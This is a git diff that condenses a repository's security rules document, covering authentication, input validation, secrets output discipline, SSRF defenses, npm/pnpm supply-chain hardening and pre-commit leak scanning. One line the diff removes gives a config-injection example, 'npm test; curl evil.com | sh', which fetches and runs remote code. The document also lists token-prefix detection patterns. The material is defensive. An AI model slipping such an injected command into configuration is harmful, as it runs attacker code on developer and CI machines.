@@ -5,164 +5,71 @@ review-date: 2026-10-23
 
 # Security Rules (Always-on)
 
-Core security principles that apply to ALL code. Web-specific rules (CSP, rate limiting, CSRF) are in `rules/opt-in-stack/security-web.md`. Compliance and AI/LLM rules live in the baseline `security-compliance` rules (not vendored into this plugin).
+All code. Web CSP/rate-limit/CSRF/session: `rules/opt-in-stack/security-web.md`; baseline security-compliance (not vendored) covers compliance/AI.
 
 ## SEC Rule Numbering Convention
-SEC identifiers are sequential; gaps are intentional:
-- **SEC-001 to SEC-003**: reserved for future core authentication/authorization rules
-- **SEC-004 to SEC-009**: core security rules (auth, validation, SQL, secrets, errors)
-- **SEC-010 to SEC-012**: compliance (baseline `security-compliance` rules, not vendored into this plugin)
-- **SEC-013 to SEC-015**: advanced protection (XXE, SSRF, crypto)
-- **SEC-016 to SEC-017**: data integrity (CSV injection, session hardening — rules/opt-in-stack/security-web.md)
-- **SEC-018**: CSRF (security-web.md); **SEC-019**: reserved (prototype pollution CWE-1321, unsafe deserialization CWE-502 — covered by SEC-006)
-- **SEC-020**: supply chain security; **SEC-021 to 024**: baseline (not vendored)
-- **SEC-025**: settings-allowlist token guard (PAT/token leakage into `.claude/settings.json` / `.claude/settings.local.json` permission entries)
+SEC-001–003/019 reserved; 004–009 core; 010–012/021–024 baseline; 013–015 advanced; 016–018 CSV/session/CSRF in security-web. Prototype pollution CWE-1321/deserialization CWE-502:006. 020 supply chain;025 settings tokens. Intentional gaps.
 
 ## Authentication (SEC-004: Auth-at-Boundary)
-- Every server action MUST authenticate first: `const { user, businessId, supabase } = await requireAuth()`
-- Client-side: `supabase.auth.getSession()` — never trust client data server-side.
-- Never pass user IDs from client; derive them from the session.
+Every server action authenticates FIRST: `const { user, businessId, supabase } = await requireAuth()`. Client: supabase.auth.getSession(); never trust client data server-side or pass client user IDs; derive from session.
 
 ## Input Validation (SEC-006)
-- Zod validation on ALL user inputs. No exceptions.
-- Minimum string lengths where appropriate (prevent empty submissions).
-- Sanitize before database queries. Use parameterized queries only.
+Zod on ALL user inputs, no exceptions; appropriate minimum string lengths prevent empty submissions. Sanitize before DB queries; parameterize only.
 
 ## SQL/PostgREST (SEC-007)
-- NEVER use template literals for SQL: `` supabase.from(`${table}`) `` is forbidden.
-- Always use parameterized queries or Supabase query builder.
-- RLS (Row Level Security) on every table. No `service_role` key in client code.
+Never SQL template literals (including supabase.from(`${table}`)); parameterized queries/Supabase query builder only. RLS EVERY table; no client service_role key.
 
 ## Secrets Management
-- All secrets in `.env` files. Never hardcode API keys, tokens, or passwords.
-- `.env`, `.env.local`, `.env.production` in `.gitignore`. Always.
-- `.env.example` with dummy values for every secret (documented).
-- Gitleaks pre-commit hook catches accidental secret commits.
-- Rotate secrets on any suspected exposure. Immediately.
+Secrets in .env, never hardcoded keys/tokens/passwords. Always gitignore .env/.env.local/.env.production; documented dummy .env.example for EVERY secret. Gitleaks pre-commit catches accidental commits. Immediately rotate any suspected exposure.
 
 ### Secrets Inventory (SEC-005)
-Past ~10 managed secrets, `.env.example` documents shape, not lifecycle. Commit a canonical inventory at `.claude/docs/SECRETS-INVENTORY.md`, one row per variable: **Variable | Purpose | Status | Expiry | Backup / Rotation**. Status is a closed enum: `OK`, `EINGESCHRÄNKT` (degraded scope), `KAPUTT` (broken/revoked), `INAKTIV` (feature disabled, kept for history). Template: `templates/shared/.claude/docs/SECRETS-INVENTORY.template.md`. Harvested from clank (~40 entries), where .env-vs-in-use drift became unmanageable. Sweep quarterly; open a `priority::high` issue for any secret expiring in < 30 days. Rotation schedule per secret type: the baseline `infrastructure` rules (not vendored into this plugin). <!-- path-check: example -->
+Past ~10 secrets, commit canonical .claude/docs/SECRETS-INVENTORY.md: one row/variable, Variable | Purpose | Status | Expiry | Backup / Rotation. Closed Status enum: OK, EINGESCHRÄNKT (degraded scope), KAPUTT (broken/revoked), INAKTIV (disabled, retained history). Sweep quarterly; expiry<30 days: priority::high issue. Template: templates/shared/.claude/docs/SECRETS-INVENTORY.template.md; type-specific rotation: baseline infrastructure (not vendored). <!-- path-check: example -->
 
 ### Secret Output Discipline (SEC-008)
-A secret value must never reach stdout, a log, or a session transcript. Masking at output is too late: scrollback, shell history and the on-disk agent transcript (retained, re-read by other agents) already hold it. Leaks come from incidental output (`cat .env`, `docker inspect`, bare `env`), not a deliberate `echo`.
-- Use a command that cannot print the value: key names (`printenv | cut -d= -f1`), presence (`test -n "${TOKEN:-}"`), length (`echo "${#TOKEN}"`), fingerprint (`printf %s "$TOKEN" | shasum -a 256 | cut -c1-12`). Filter inside the same pipeline, never after printing.
-- Never put a secret in argv (world-readable via `ps`; lands in shell history, `set -x` traces, CI logs) or a URL query string — pass it via env var, stdin or a mode-0600 file. In code, log credential IDs or salted hashes.
-- Emitted anyway → compromised: rotate and revoke **before** cleanup, then record it in the SEC-005 inventory if one exists.
+Secret values NEVER reach stdout/log/transcript; after-output masking is too late (scrollback/history/on-disk transcripts). Avoid incidental cat .env/docker inspect/bare env output. Commands must print only key names, presence, length or fingerprint, filtering WITHIN same pipeline before any value emission. Never secrets in argv (ps/history/set-x/CI exposure) or URL query; use env/stdin/mode-0600 file. Code logs credential IDs or salted hashes. If emitted: compromised; rotate AND revoke BEFORE cleanup, then record SEC-005 inventory if present.
 
 ## Error Exposure (SEC-009)
-- Never return `error.message` directly to the client.
-- Map errors to user-friendly messages. Log originals server-side.
-- Stack traces: development only, never in production responses.
+Never client error.message; map friendly messages, log originals server-side. Stack traces development only, NEVER production responses.
 
 ## XXE Prevention (SEC-013)
-- Disable external entity processing: `fast-xml-parser` → `processEntities: false`. Never use `DOMParser` with untrusted XML.
-- Prefer JSON over XML at all API boundaries; if XML is required, validate against a strict XSD first.
-- Never pass user-supplied file content to XML parsers without sanitization.
+Disable external entities: fast-xml-parser processEntities:false; never DOMParser for untrusted XML. Prefer JSON at ALL API boundaries; required XML validates strict XSD FIRST. Never unsanitized user file content to XML parser.
 
 ## SSRF Prevention (SEC-014)
-- Use `safeFetch()` / `safeFetchJSON()` from `@your-org/http-client` for all user-supplied URLs. These block private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, ::1, 169.254.x) and non-HTTP schemes before requesting.
-- For internal service-to-service calls (e.g., Clank → an internal host on a private IP range), use `fetchWithTimeout()` or pass `allowPrivateNetworks: true`.
-- **DNS rebinding defense:** `dnsValidation: true` in `safeFetch()`/`safeFetchJSON()` options resolves DNS and validates the resolved IP before connecting, on each redirect hop too. **Node.js-only** — uses `dns.promises.lookup()`. Standalone: `resolveAndValidate()`, exported from `@your-org/http-client`.
-- Set explicit timeouts (5s default) and limit redirects (max 3 with re-validation) on server-side HTTP clients.
-- Redirect handling: `redirect: 'manual'` plus re-validation of each Location URL via `validateUrl()` before following, against redirect-based SSRF. `safeFetch()` in `@your-org/http-client` implements this with `RedirectLimitError` for exceeded limits.
+ALL user URLs: @your-org/http-client safeFetch()/safeFetchJSON(), blocking non-HTTP schemes/private ranges 10.x,172.16–31.x,192.168.x,127.x,::1,169.254.x BEFORE requesting. Internal service calls may fetchWithTimeout() or allowPrivateNetworks:true. DNS rebinding: dnsValidation:true resolves/validates IP BEFORE connecting and EACH redirect hop (Node-only dns.promises.lookup; standalone resolveAndValidate exported by same package). Explicit timeouts (5s default), max3 redirects WITH revalidation. redirect:'manual'; validateUrl() EACH Location before following; safeFetch throws RedirectLimitError when exceeded.
 
 ## Dependencies
-- The canonical PM's production audit in CI — `npm audit --omit=dev --audit-level=high` / `pnpm audit --prod --audit-level=high`. Block deploys on high/critical vulnerabilities.
-- Gitleaks (37 rules) in CI — verified here (`.gitleaks.toml`, GitLab job `gitleaks-scan` + a SHA-pinned GitHub action). **Semgrep SAST is adopted here, but NOT in the baseline's shape**: measured 2026-08-28 @ `30940cb` (`grep -c "^- id:" .semgrep.yml` → 27): `.semgrep.yml` carries **27** rules, not the baseline's 64, and no managed rulesets — delta **37 removed, 0 added** (identical in `.semgrep.yml`'s own "Drift check against the baseline" section, measured @ `4950990`). Its header accounts for 5 as measured false positives (78 findings, all from those five, measured 2026-08-22) plus 2 absent for lack of a call site (`unsafe-llm-prompt-injection`, `unsafe-llm-output-rendering`); the remaining 30 are not individually accounted for. A live scan at that SHA (`semgrep scan --config .semgrep.yml --metrics=off --quiet scripts/ hooks/ skills/ agents/ commands/ monitors/ pi/`) returns 25 findings — the same count its header carries, dated the same day. CI: GitLab job `semgrep:` (`.gitlab-ci.yml:300`, image `semgrep/semgrep:1.161.0`), gated on findings NEW since the baseline commit, wired into `pipeline-gate` (`:719`). **GitHub Actions: 0 references** (`rg -n semgrep .github/` → no matches, measured 2026-08-28) — the mirror runs no SAST.
-- Review `node_modules` additions in PRs (supply chain awareness).
+Canonical-PM production audit in CI: `npm audit --omit=dev --audit-level=high` / `pnpm audit --prod --audit-level=high`; block deploys on high/critical. Gitleaks in CI (.gitleaks.toml, GitLab gitleaks-scan, SHA-pinned GitHub action). Review node_modules additions in PRs. This repo's Semgrep is local .semgrep.yml in GitLab, gating NEW findings since baseline and feeding pipeline-gate; no mirror SAST/parity assumed.
 
 ## Supply Chain Security (SEC-020)
-
-**Scope note — check the package manager before reading an omission as a gap.** Only `ignore-scripts` below is read by BOTH npm and pnpm; the other four keys are **pnpm-only directives npm silently ignores**. An npm-canonical repo omitting them is CORRECT — this repo is one (tracked `package-lock.json`, `development.md` § Package Management); its `.npmrc` records the omission in a comment. Measured 2026-08-22 @ `141d418`: `npm config get ignore-scripts` → `true`.
-
-- **npm + pnpm** — `ignore-scripts=true` in `.npmrc` as the global default: no package runs install/postinstall/prepare scripts unless allowlisted via package.json `pnpm.onlyBuiltDependencies` (pnpm-only; npm: all-or-nothing). The single most effective defense against Axios-style postinstall attacks.
-- **pnpm** — allowlisted packages (native binaries that genuinely need install scripts): `@your-org/*`, `esbuild`, `sharp`, `@playwright/test`, `@sentry/cli`, `prisma`, `better-sqlite3`, `@typescript/native-preview`. Add a new entry only after verifying the package requires postinstall.
-- **pnpm** — `block-exotic-subdeps=true` in `.npmrc` stops transitive deps using git or tarball sources. Mitigates PackageGate-class attacks (CVE-2026-xxxx).
-- **pnpm** — `minimum-release-age=1440` (24 hours) delays updates, giving security vendors time to detect malicious releases.
-- **pnpm** — `trust-policy=no-downgrade` rejects packages with lower trust signals than previously installed.
-- **npm** — `npm audit signatures` in CI verifies registry signatures/provenance of installed tarballs — the npm-native counterpart to pnpm's `trust-policy`. Required in every npm-canonical pipeline.
-- **A repo-local `.npmrc` is CWD-scoped and does not travel.** npm resolves config from the working directory upward, so anything invoked outside a repo never sees the hardening — measured 2026-08-22: a globally configured MCP server ran `npx -y <pkg>@latest` from `$HOME`, where `~/.npmrc` carried no `ignore-scripts`. Set the key host-wide too; verify with `cd /tmp && npm config get ignore-scripts`.
-- Never use `git+ssh://` or `git+https://` as dependency specifiers in `package.json` — always npm registry versions.
-- Audit every new dependency before adding: npm download trends, last publish date, maintainer count. Minimum 1000 weekly downloads unless justified.
-- In CI always use the canonical PM's frozen-lockfile install — `npm ci` / `pnpm install --frozen-lockfile` — against lockfile tampering.
-- Registry hijacking is mitigated by pnpm's scoped registry config in `.npmrc` (`@your-org:registry=...` + `strict-ssl=true`). pnpm v9 lockfiles do not embed registry URLs — they resolve from `.npmrc` at install time.
+Check canonical PM first: npm reads ignore-scripts but silently ignores pnpm-only block-exotic-subdeps/minimum-release-age/trust-policy/onlyBuiltDependencies. Their omission in npm-canonical repos is correct; this repo uses committed package-lock.json.
+- npm AND pnpm: `.npmrc` ignore-scripts=true globally; no install/postinstall/prepare unless pnpm allowlisted (npm is all-or-nothing).
+- pnpm `onlyBuiltDependencies` allowlist: @your-org/*, esbuild, sharp, @playwright/test, @sentry/cli, prisma, better-sqlite3, @typescript/native-preview. Verify postinstall is genuinely needed BEFORE adding entries.
+- pnpm: block-exotic-subdeps=true, minimum-release-age=1440 (24h), trust-policy=no-downgrade.
+- npm: `npm audit signatures` REQUIRED in every npm-canonical CI pipeline for registry signatures/provenance.
+- Repo .npmrc is CWD-scoped and does not travel: set ignore-scripts host-wide too and verify `cd /tmp && npm config get ignore-scripts`.
+- No git+ssh:// or git+https:// package.json specs; use registry versions.
+- Audit EVERY new dependency: download trends, last publish, maintainer count; ≥1000 weekly downloads unless justified.
+- CI frozen installs: `npm ci` / `pnpm install --frozen-lockfile`.
+- pnpm scoped registry in .npmrc (@your-org:registry=... + strict-ssl=true) mitigates hijack; v9 lockfiles resolve registry from .npmrc, not embedded URLs.
 
 ### Session Config Command Trust (Quality-Gate Command Injection)
-
-The quality-gate loop resolves gate commands via three-level precedence (explicit override → Session Config → built-in defaults) and executes them with `spawnSync(cmd, { shell: true })` — so a malicious commit to `CLAUDE.md` can inject shell metacharacters (`test-command: npm test; curl evil.com | sh`), RCE-equivalent within the repo's trust model.
-
-**Why this is acceptable by design:**
-
-- **VCS anchors trust:** every `CLAUDE.md` edit is commit-gated — a malicious Session Config change must land in `HEAD`, visible in `git log` and reviewed before merge.
-- **No privilege escalation:** the fixer-agent dispatch runs within the session's existing permissions, and anyone who can commit can already execute arbitrary code via `package.json` scripts, `.husky/` hooks or test files. Session Config `*-command` is **not** a new attack surface — it is the existing commit-review trust model.
-- **Bounded scope:** commands run only during inter-wave Quality-Gate runs with `verification-auto-fix.enabled: true` (default `false`).
-
-**Where the VCS anchor does not reach (measured 2026-09-09).** "Commit-gated therefore reviewed" holds for the GitLab `origin` path (MR review) **only**. The GitHub mirror's `main` is pushed **directly from the operator's machine** — `git push github HEAD` (`skills/session-end/SKILL.md`, every `/close`) and `git push github main` + tag (`scripts/release.mjs`) — authenticated by the local `gh auth git-credential` keychain entry, not by any CI job or CI variable. That branch triggers the Vercel production deploy of session-orchestrator.com, so a compromised local GitHub credential or coordinator session deploys unreviewed. Live compensating controls: `required_status_checks.strict: true` over 3 contexts, `allow_force_pushes: false` / `allow_deletions: false`, and the read-only `scripts/github-protection-audit.mjs`. Open gap `enforce_admins: false` (#1079) — do **not** flip it while the push path still targets protected `main` directly, or every `/close` and every release push fails. Runbook and required ordering: `docs/github-mirror-protection.md`.
-
-**The five command-bearing surfaces (sanctioned):**
-
-1. `test-command` — Quality-Gate test runner.
-2. `typecheck-command` — Quality-Gate typecheck runner.
-3. `lint-command` — Quality-Gate lint runner.
-4. `custom-phases[].command` (#637) — repo-declared deterministic close/housekeeping phases run at session-end Phase 2.5 via Bash with exit-code gating. Same VCS-trust-anchor model as the trio above. Defense-in-depth: `scripts/lib/config/custom-phases.mjs` rejects shell metacharacters in `command`/`review`/`name` and drops the offending record with a WARN.
-5. `agent-mapping.<role>` (#1150) — not a command string but a **dispatch target**, the same trust class. A value shaped `<channel>:<target>` (e.g. `impl: cursor:composer-2.5`) routes that wave role to a foreign binary spawned via Bash instead of a native `Agent()` subagent. `scripts/lib/config.mjs` restricts the channel to a known list and rejects an empty target, but cannot vouch for what the binary does.
-
-**Operator audit checklist:**
-
-1. **Review Session Config drift** in standard code review. Any PR modifying a command-bearing key MUST show the before/after.
-2. **Watch for unexpected Session Config keys.** A command-bearing entry outside the five surfaces above is an investigation trigger — those are what `scripts/parse-config.mjs` parses into executable commands.
-3. **An `agent-mapping` role changing from a bare agent name to `cursor:*` MUST show before/after** and cite the foreign-dispatch trust boundary: it moves that wave role from a native subagent (observed by the whole hook chain — scope guard, destructive-command guard, `SubagentStop` telemetry) to a Bash-spawned binary none of those hooks see.
-4. **Treat Session Config like code** — a malicious change to it is a malicious code change: use the existing VCS review, no extra gates.
-
-Cross-references: `scripts/lib/qg-command-drift-banner.mjs` (session-start banner for `*-command` drift) · `scripts/lib/quality-gate.mjs` (`runQualityGateWithRetry`) · `.claude/rules/quality-gates-autofix.md` (auto-fix loop behaviour).
+Treat executable config as code under existing VCS review, no extra gates. Sanctioned surfaces: test-command, typecheck-command, lint-command, custom-phases[].command (deterministic Bash phases at close/housekeeping Phase2.5 with exit gates), agent-mapping.<role> (dispatch target `<channel>:<target>` to foreign binary via Bash). EVERY PR changing one MUST show before/after. Unexpected command-bearing keys trigger investigation. Bare-agent→cursor:* mapping MUST show before/after AND cite boundary: foreign Bash binary is unseen by native scope/destructive guards and SubagentStop telemetry. Known-channel/nonempty-target validation does not establish binary trust. Custom phase command/review/name rejects shell metacharacters with WARN/drop.
+Gate command precedence: explicit override > Session Config > defaults. Auto-fix inter-wave use requires verification-auto-fix.enabled:true (default false), existing permissions only. Do not infer current runner enforcement from historical shell:true documentation.
+GitLab MR review does not cover direct GitHub mirror main pushes from local credentials; these trigger Vercel production deployment. Compensating controls: required_status_checks.strict:true (3 contexts), allow_force_pushes:false, allow_deletions:false, read-only scripts/github-protection-audit.mjs. Gap enforce_admins:false (#1079): do NOT flip while close/release push directly to protected main; first follow ordering in docs/github-mirror-protection.md.
+References: scripts/lib/qg-command-drift-banner.mjs · scripts/lib/quality-gate.mjs (runQualityGateWithRetry) · quality-gates-autofix.md.
 
 ### SEC-020-1: Package Legitimacy Audit (Slopcheck — #520)
-
-`classifyPackages()` (`scripts/lib/slopcheck.mjs`, gsd Pattern 2, #520) guards against LLM-hallucinated package names ("Slopsquatting" — documented incidents 2024/2025). With `slopcheck.enabled: true` (default `false`), the plan-skill runs Phase 3.5 Package-Audit on PRD-mentioned packages (`skills/plan/SKILL.md`) and the discovery probe `skills/discovery/probes/supply-chain-slopcheck.mjs` runs over `package.json` / `requirements.txt` / `Cargo.toml`.
-
-Classifications:
-- **LEGITIMATE**: package exists + download_count > threshold
-- **ASSUMED**: package exists but very new / low downloads (warning, not block)
-- **SUS**: audit warning hit (operator confirmation required)
-- **SLOP**: package not in registry — possible LLM hallucination (hard block in plan-flow)
-
-**Complementary** to the SEC-020 baseline (`ignore-scripts=true`, `block-exotic-subdeps=true`, `minimum-release-age=1440`): SEC-020 prevents post-install execution of malicious packages; Slopcheck prevents adopting non-existent (typosquat-target) packages at all.
+slopcheck.enabled:true (default false): scripts/lib/slopcheck.mjs classifyPackages(); plan Phase3.5 PRD packages (skills/plan/SKILL.md); skills/discovery/probes/supply-chain-slopcheck.mjs checks package.json/requirements.txt/Cargo.toml. LEGITIMATE exists+download_count>threshold; ASSUMED exists but new/low downloads (warn, no block); SUS audit warning requires operator confirmation; SLOP absent from registry hard-blocks plan flow. Complement SEC-020 execution controls; do not adopt hallucinated packages.
 
 ## Owner-Privacy Pre-Commit Hook (#494)
-- Repositories with private slugs, personal home paths, or non-public hosts MUST run an owner-leakage scanner as a pre-commit hook stage — CI catches the same leak too late (it lands on the public branch first).
-- Reuse the scanner CI runs (`scripts/lib/validate/check-owner-leakage.mjs` or equivalent) — Local/CI parity is essential; a separate local-only ruleset drifts and gives false confidence.
-- Invocation pattern in `.husky/pre-commit`:
-  ```sh
-  node scripts/lib/validate/check-owner-leakage.mjs "$(git rev-parse --show-toplevel)" >/dev/null 2>&1 || {
-    echo "✗ check-owner-leakage: privacy leak detected in tracked files. Commit blocked." >&2
-    echo "  Run \`node scripts/lib/validate/check-owner-leakage.mjs .\` for details." >&2
-    exit 1
-  }
-  ```
-- The scanner runs against the staged tree (`git ls-files` sees staged-but-not-committed files), closing the `git add <leak> && git commit` gap — the root cause of three pre-#494 CI red incidents (deep-1, deep-2, deep-3).
-- **Untracked files: the offload gate is sharper than the local one.** Both call sites (`.husky/pre-commit:116`, `.gitlab-ci.yml:370`) omit its `--include-untracked` flag (`:132`), so untracked files go unscanned locally; on an offload host the same file arrives tracked and IS scanned. `.orchestrator/tmp/` is gitignored, `.orchestrator/` itself is not — that is how an untracked `.orchestrator/tmp-dialectic-prompt.txt` turned the m5 gate red at CP2/CP7 after a green local run. Keep working files in `.orchestrator/tmp/`.
+Repos with private slugs/home paths/nonpublic hosts MUST pre-commit scan owner leakage: reuse same CI scanner (scripts/lib/validate/check-owner-leakage.mjs or equivalent), never divergent local rules. Nonzero blocks commit. It scans staged/tracked tree via git ls-files, catching staged leaks, but local/CI omit --include-untracked: local untracked may become tracked on offload and then fail. Keep working files in gitignored `.orchestrator/tmp/`, not arbitrary .orchestrator/ files.
 - `git commit --no-verify` bypass remains available — use only after triage.
-- Regression test: `tests/husky/pre-commit-owner-leakage.test.mjs` (hook carries the scanner invocation; E2E leaks planted in a tmp git repo block the commit).
+Test: tests/husky/pre-commit-owner-leakage.test.mjs; mechanics: security-surfaces.md.
 
 ## Settings-Allowlist Token Guard (SEC-025, #728b)
-- Never place a live PAT/token as a permission-allowlist entry in `.claude/settings.json` or `.claude/settings.local.json` (e.g. a `Bash(glab ... glpat-…:...)` line). A live GitLab PAT once surfaced this way in cleartext in a portfolio repo. Use an env-var reference or the OS keychain — never the raw secret value.
+- Never place a live PAT/token as a permission-allowlist entry in `.claude/settings.json` or `.claude/settings.local.json` (e.g. a `Bash(glab ... glpat-…:...)` line). Use an env-var reference or the OS keychain — never the raw secret value.
 - `.gitleaks.toml` (37 rules) is the canonical regex source for token shapes (`glpat-`, `ghp_`, `github_pat_`, `sk-ant-`, `AKIA`, …); `scripts/lib/validate/check-test-fixture-shapes.mjs` (patterns F5–F8) is the in-repo prior art for the same shapes in test fixtures. Do not maintain a fifth copy — the `repo-audit` Category 6 grep row (`skills/repo-audit/SKILL.md`) is a deliberate high-signal SUBSET of the 5 prefixes above, not a competing source of truth.
 - **Why `check-owner-leakage.mjs` does not cover this:** it scans `git ls-files` (tracked only, by design), and `.claude/settings.local.json` is conventionally untracked, so a token there is invisible to the pre-commit hook. `repo-audit`'s on-disk grep is the only mechanism here that reads the live file regardless of tracked status.
-
-## OWASP Top 10 2021 Mapping
-
-| OWASP ID | Risk | Baseline Coverage |
-|---|---|---|
-| A01 | Broken Access Control | SEC-004 (Auth-at-Boundary), SEC-007 (RLS), rules/opt-in-stack/security-web.md (CSRF), open-redirect (CWE-601), path-traversal (CWE-22) |
-| A02 | Cryptographic Failures | SEC-015 (below), weak-hash (CWE-328), TLS validation (CWE-295), Math.random detection (CWE-338), Semgrep rules #37-38, #42-43 |
-| A03 | Injection | SEC-006 (Zod), SEC-007 (parameterized queries), SEC-013 (XXE), prototype-pollution (CWE-1321), ReDoS (CWE-1333), DOMPurify sanitization |
-| A04 | Insecure Design | MVP scope rules (mvp-scope.md), threat modeling at design phase |
-| A05 | Security Misconfiguration | rules/opt-in-stack/security-web.md (CSP, headers, CORS), CORS wildcard (CWE-942), baseline infrastructure rules — Docker hardening (not vendored) |
-| A06 | Vulnerable Components | Dependencies section (canonical-PM audit), CI Semgrep (27 rules, GitLab only — see § Dependencies) + Gitleaks (37 rules) |
-| A07 | Auth Failures | SEC-004 (requireAuth), SEC-017 (session hardening in rules/opt-in-stack/security-web.md) |
-| A08 | Data Integrity Failures | CI/CD pipeline integrity, Gitleaks, pnpm lockfile, SEC-020 (supply chain), json-parse-untrusted (CWE-502) |
-| A09 | Logging Failures | rules/opt-in-stack/backend.md (structured logging), @your-org/logger, SEC-008 (no secrets in output/logs/transcripts, CWE-532) |
-| A10 | SSRF | SEC-014 (safeFetch/safeFetchJSON, redirect re-validation) |
 
 ## Cryptographic Failures (SEC-015)
 - TLS 1.3 minimum for all external connections. Never allow TLS 1.0/1.1.
